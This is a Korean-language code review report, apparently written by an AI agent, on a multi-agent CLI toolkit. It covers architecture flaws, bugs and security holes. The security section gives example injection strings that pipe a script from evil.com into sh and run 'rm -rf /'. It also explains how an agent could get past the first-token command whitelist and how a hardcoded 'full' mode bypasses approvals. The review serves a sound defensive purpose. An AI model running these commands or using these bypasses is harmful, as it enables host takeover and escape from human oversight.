---
evaluator: agy
date: 2026-06-29
---

# 외부 리뷰어 객관적 코드 평가 보고서 — cli-agent-team

본 보고서는 외부 리뷰어의 관점에서 사전 지식 없이 `C:\Users\dhtmd\OneDrive\바탕 화면\claude-toolkit\skills\cli-agent-team\` 경로의 코드를 직접 읽고 분석하여 작성한 객관적인 평가서입니다. 칭찬보다는 발견된 문제점, 아키텍처 결함, 보안 취약점 및 버그 발굴에 초점을 맞추었습니다.

---

## 1. 아키텍처 (Score: 7/10)

### 컴포넌트 간 결합도 및 전체 흐름 일관성 분석
- **전체 흐름의 연결성**: `dispatch.sh` (실행) → `verify.sh` (검증) → `record-score.sh` (점수 기록)로 이어지는 흐름 자체는 논리적이지만, 각 스크립트 간의 책임 분리가 명확하지 않고 강한 결합(Strong Coupling)이 형성되어 있습니다.
- **문제점 1 (단일 책임 원칙 위배 및 강한 의존성)**:
  - [verify.sh:L310-L327](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/verify.sh#L310-L327) 및 [verify.sh:L339-L354](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/verify.sh#L339-L354)에서 검증을 담당해야 할 `verify.sh`가 내부에서 직접 `record-score.sh`를 호출하여 통과 및 실패 점수를 기록하고 있습니다. 검증(Verification) 컴포넌트가 기록(Scoring) 도메인에 결합되어 있으므로, 차후 다른 채점 방식이나 로깅 시스템을 도입할 때 유연성이 극히 떨어집니다. 점수 기록 호출은 상위 오케스트레이터(`agent-team.sh` 또는 Claude 메인 루프)가 직접 관리하는 것이 아키텍처상 올바릅니다.
  - [dispatch.sh:L367-L391](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/dispatch.sh#L367-L391)에서 에이전트 실행기여야 할 `dispatch.sh` 내부에서 `agy` 실행 실패(출력 없음 등) 시 `codex`로 폴백하는 로직이 직접 하드코딩되어 있습니다. 에이전트의 선택 및 라우팅 전략(Fallback & Routing)은 상위 배정 컨트롤러의 역할이어야 하나, 실행 하위 컴포넌트가 상위의 의사결정을 가로채 수행하고 있습니다.
- **문제점 2 (상태 공유 메커니즘의 취약성)**:
  - `verify.sh`가 어떤 에이전트가 실행되었는지를 알아내는 방식인 [verify.sh:L317-L319](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/verify.sh#L317-L319)는 디렉토리 내에 특정 파일들(`_agy_stdout.log`, `_codex_stdout.log`, `_codex_fallback.log`)이 존재하는지 단순 파일 체크를 수행합니다. 만약 이전 세션에서 남아 있는 로그 잔재가 있다면 실제로 실행되지 않은 에이전트를 실행되었다고 잘못 판단하여 엉뚱한 점수를 기록할 위험이 상존합니다.

### 좋은 설계 결정 vs 잘못된 설계 결정
- **좋은 결정**: `.session_state`를 별도 파일로 관리하여 세션 중단(레이트 리밋 등) 시 상태를 즉시 복원하고 단계를 이어갈 수 있도록 설계한 부분 및 `git worktree`를 도입하여 병렬 실행 중 소스 파일 충돌을 물리적으로 피하려 시도한 부분.
- **잘못된 결정**: 오케스트레이터의 핵심 역할(에이전트 판단, 에러 폴백, 스코어링 호출)을 개별 스크립트(`dispatch.sh`, `verify.sh`) 내부로 난해하게 분산시킨 구조.

---

## 2. 코드 품질 (Score: 5/10)

### 쉘 스크립트 구현의 견고함 및 예외 처리
- **문제점 1 (Windows Git Bash 환경에서의 `timeout` 명령어 오작동)**:
  - [dispatch.sh:L288-L295](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/dispatch.sh#L288-L295)에서 `command -v timeout`을 사용하여 시간 초과 플래그를 처리합니다. Windows 환경에서 Git Bash를 사용하는 경우, 이 검사는 Windows의 시스템 내장 명령어인 `C:\Windows\System32\timeout.exe`를 감지하여 참을 반환합니다.
  - 하지만 Windows `timeout` 명령어는 단순히 입력 대기 지연(sleep) 용도로만 동작하며, GNU `timeout`처럼 뒤에 실행될 명령어 파라미터(`timeout 30m codex exec ...`)를 받지 않습니다. 이 때문에 Windows 사용자 환경에서 dispatch를 실행하는 즉시 Windows timeout 유틸리티가 구문 오류(`ERROR: Invalid syntax.`)를 내뿜으며 에이전트 실행이 시작조차 못 하고 즉시 실패합니다.
- **문제점 2 (cross-review.sh 매개변수 바인딩 치명적 오류)**:
  - [agent-team.sh:L25](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/agent-team.sh#L25) 및 [quickstart.md:L119](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/docs/quickstart.md#L119)에 명시된 가이드는 `agent-team cross-review T001 full` 형태로 호출하게 되어 있으나, [cross-review.sh:L9-L12](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/cross-review.sh#L9-L12)를 보면 인수를 다음과 같이 받습니다:
    ```bash
    TASK_ID="${1:?사용법: cross-review.sh <task-id> [project-dir]}"
    PROJECT_DIR="${2:-$(pwd)}"
    ```
    즉, 두 번째 매개변수(`$2`)를 권한 모드가 아닌 프로젝트 디렉토리로 직접 해석합니다. 따라서 문서 가이드대로 `agent-team cross-review T001 full`을 호출하면 프로젝트 디렉토리를 `full`로 인식하여 존재하지 않는 `full/_agent_reports/T001/TASK.md` 경로를 확인하려다 에러를 뿜고 즉시 크래시가 납니다. 실제 구동이 전혀 불가능한 심각한 버그입니다.
- **문제점 3 (Trap을 통한 예외 은폐 및 맹목적 성공 처리)**:
  - [dispatch.sh:L31-L44](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/dispatch.sh#L31-L44)에 지정된 `_on_exit` trap은 에이전트 실행 도중 오류가 나서 프로세스가 비정상 종료(non-zero)되더라도, 에러 시점 직전 작성된 `REPORT.md` 파일에 `- [x]` 문양이 들어있기만 하면 강제로 성공(`exit 0`)으로 속이고 넘어갑니다.
  - 에이전트가 검증 단계에서 컴파일 에러를 냈거나 심각한 런타임 에러로 강제 종료되었더라도 단순히 마크다운 파일 파싱 결과로 이를 '성공'이라 덮어씀으로써 버그를 조기에 캐치하지 못하게 만듭니다.

---

## 3. 보안 (Score: 4/10)

### 화이트리스트 명령 실행의 실제 효과 검증
- **문제점 1 (화이트리스트 보안 우회 및 원격 코드 실행 취약점)**:
  - `verify.sh`는 에이전트가 임의의 쉘 명령어를 실행하여 호스트를 탈취하는 행위를 제한하기 위해 명령어 화이트리스트를 검사합니다. 그러나 [verify.sh:L192](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/verify.sh#L192)에서 구현된 추출 방식은 명령어 라인의 "첫 번째 토큰"만 추출합니다:
    ```bash
    _cmd_bin=$(echo "$cmd" | sed 's/^[[:space:]]*//' | cut -d' ' -f1 | sed 's|.*/||')
    ```
  - 만약 에이전트가 `AGENT_ROLES.md` 내에 `npm test && rm -rf /` 혹은 `npm test ; curl http://evil.com/shell.sh | sh` 와 같이 쉘 분기 및 파이프 연산자(`&&`, `;`, `|`)가 혼합된 공격 구문을 삽입하면, 검사기에는 허용된 `npm`으로 패스되고, 실제 [verify.sh:L202](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/verify.sh#L202)에서 실행될 때는 `bash -c "$cmd"`를 통해 공격 명령어가 그대로 실시간으로 구동됩니다.
  - 더구나 화이트리스트 `_wl` 변수 내에 `bash`, `sh`, `node`, `python`, `python3` 등 강력한 범용 스크립트 실행기가 모두 포함되어 있어 에이전트가 어떤 공격 구문이든 마음대로 포장해 돌릴 수 있습니다. 이로 인해 설계된 보안 검증 장치는 아무런 방어 효과가 없는 "보안 솔루션 시늉(Security Theater)"에 불과합니다.
- **문제점 2 (cross-review.sh의 권한 상승 하드코딩)**:
  - [cross-review.sh:L24 및 L37](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/cross-review.sh#L24)에서 `dispatch.sh`를 구동할 때 권한 모드를 무조건 `full`로 하드코딩하고 있습니다.
  - 사용자가 프로젝트 안전을 보장하기 위해 승인을 거치는 `limited` 모드로 루프를 시작했더라도, 크로스 리뷰 스크립트를 호출하면 내부적으로 강제로 권한 모드가 `full`로 승격되어 에이전트들이 샌드박스와 승인을 전부 우회하여 가동됩니다.

---

## 4. 실용성 (Score: 6/10)

### 5분 온보딩 가능 여부 및 사용자 피드백 파악성
- **문제점 1 (복잡한 에이전트 데몬 관리 공수)**:
  - 실시간 확인과 빠른 구동을 위해 터미널 패널을 분할하고 `agent-watch.ps1` 또는 `agent-watch.sh`를 각각 에이전트별로 띄워 데몬 상태를 가동하라고 제시되어 있습니다 (`SKILL.md` 및 `quickstart.md`).
  - 매번 수동으로 여러 터미널을 열어 데몬 스크립트를 띄우고 옵션을 연계해야 하는 과정은 복잡하며, 백그라운드 프로세스가 죽거나 좀비 프로세스로 남았을 때 추적 및 청소가 어렵습니다. 일반 사용자가 5분 만에 세팅을 마치고 오류 없이 사용하기에는 불필요하게 아키텍처가 무겁습니다.
- **문제점 2 (에러 원인 추적의 불편함)**:
  - `verify.sh` 가 실패했을 때 나오는 요약 피드백은 기계적으로 "파일 없음", "AC 실패" 등의 텍스트 결과만 나열할 뿐, 에이전트 세션의 실제 실행 로그에서 왜 그런 현상이 발생했는지 구체적인 컨텍스트를 담아주지 못합니다.
  - 사용자는 실행 오류의 진짜 원인(예: 레이트 리밋에 걸려 멈춤, API 요청 거부 등)을 파악하기 위해서 매번 `_agent_reports/<task-id>/_<cli>_stdout.log` 로그 파일을 직접 열어 끝까지 파헤쳐 읽어야 하므로, 문제 발생 시 대처 가독성이 크게 떨어집니다.

---

## 5. 놓친 것 / 맹점 (Score: 5/10)

### 설계 상 간과했거나 실제 가동 시 깨지는 지점들
- **문제점 1 (병렬 실행과 워크트리 격리의 충돌 모순)**:
  - [worktree-dispatch.sh:L46-L49](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/worktree-dispatch.sh#L46-L49)를 보면 메인 저장소에 커밋되지 않은 소스 변경이 존재하면 worktree 생성을 우회하고 메인 저장소에 직접 `dispatch.sh`를 실행하도록 폴백합니다.
  - 만약 T-A와 T-B 두 개의 작업을 병렬 실행하게 되면, 먼저 끝난 T-A가 작업물을 메인 저장소로 복사해 놓는 순간 메인 저장소는 uncommitted 변경이 존재하는 dirty 상태가 됩니다.
  - 이로 인해 뒤늦게 완료되거나 구동되는 T-B는 워크트리 생성을 차단당하고 메인 저장소에서 직접 돌아가게 됨으로써, 워크트리 격리 설계의 장점(병렬 충돌 및 파일 오염 방지)이 한순간에 깨지며 격리가 해제되는 아키텍처적 모순이 발생합니다.
- **문제점 2 (강제 중단 시 가비지 워크트리 및 임시 브랜치 정리 부재)**:
  - `worktree-dispatch.sh` 실행 도중 에러가 나거나 사용자가 Ctrl+C 등으로 중간에 세션을 끊는 경우, 생성된 `_worktrees/<task-id>` 폴더와 `worktree/<task-id>` 임시 브랜치는 정리(Clean up)되지 않고 고스란히 남아 git 리포지토리 환경을 오염시킵니다.
  - 쉘 스크립트 작성 시 비정상 종료를 잡을 EXIT/INT Trap이 누락되어 있어 안전장치가 부실합니다.
- **문제점 3 (문서와 구현의 스펙 불일치)**:
  - [SKILL.md:L937](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/SKILL.md#L937)에 `auto` 배정 시 `claude` 에이전트로 폴백할 수 있다고 기술되어 있으나, 정작 [dispatch.sh:L354](file:///C:/Users/dhtmd/OneDrive/바탕%20화면/claude-toolkit/skills/cli-agent-team/scripts/dispatch.sh#L354) 구현에서는 아직 직접 모드가 지원되지 않아 에러 메시지와 함께 `exit 2`로 비정상 종료됩니다. 미구현 스펙이 스킬 가이드에 완성된 것처럼 설명되어 있습니다.

---

## 6. 종합 판정

- **전체 점수**: **5.3 / 10**
- **"이 도구를 실제로 쓰겠는가?"**: **Conditional (조건부 사용)**
  - **이유**: `git worktree` 격리를 활용한 병렬 분배 및 각 태스크 난이도/성향에 맞게 에이전트의 승률 데이터를 수집해 배정 비율을 가중 조정하는 자동 배정 라우팅 발상은 획기적이고 실용적입니다.
  - 하지만 Windows Git Bash 환경에서의 `timeout` 명령어 미지원으로 인한 크래시, `cross-review.sh` 매개변수 시프트 오류로 인한 즉시 비정상 종료, 격리 모드에서 uncommitted 변경 감지 시 병렬 격리를 스스로 무력화하는 폴백 로직, RCE(원격 코드 실행)를 예방하지 못하는 부실한 명령어 화이트리스트 검사 등 **구동성과 보안 측면에서 결정적인 결함**들이 다수 포진해 있습니다. 따라서 이 중결함 요소들이 패치되기 전에는 실제 프로덕션 리포지토리에 도입해 사용하기는 매우 부적합합니다.

### 지금 당장 고쳐야 할 세 가지 긴급 패치 사항
1. **`cross-review.sh` 매개변수 파싱 및 모드 하드코딩 해결**:
   - `cross-review.sh`가 `$2` 매개변수로 프로젝트 경로가 아닌 올바른 인증 모드(`$AUTH`)를 받게 하고 `agent-team.sh`와의 호출 인터페이스 규격을 단일화하여 실행 크래시를 우선 수정해야 합니다. 또한, 권한 모드를 무조건 `full`로 가동하는 하드코딩을 제거해 보안 우회를 차단해야 합니다.
2. **`dispatch.sh` 내 Windows `timeout` 명령어 충돌 우회**:
   - OS가 Windows(Git Bash)인지 확인하는 조건을 추가하여, Windows 환경일 경우에는 쉘 실행 파일 직접 래핑을 위해 GNU timeout 대신 `sleep` 메커니즘을 적용하거나 백그라운드 실행 관리 유틸을 다르게 타게 해야 합니다.
3. **`verify.sh` 화이트리스트 검사 구문 우회 차단**:
   - 단순 명령어의 첫 단어 필터링을 폐기하고, 검증 명령어에 `;`, `&&`, `||`, `|`, `$` 등의 메타캐릭터를 포함한 임의의 다중 명령 주입이 이루어졌는지 정규식으로 면밀히 분석한 후 차단해야 합니다. 또한 호스트 탈취 위험이 있는 `bash`, `node` 등을 기본 화이트리스트 목록에서 차단 또는 격리된 컨테이너 환경 내에서 검증 명령이 돌아가도록 수정이 시급합니다.
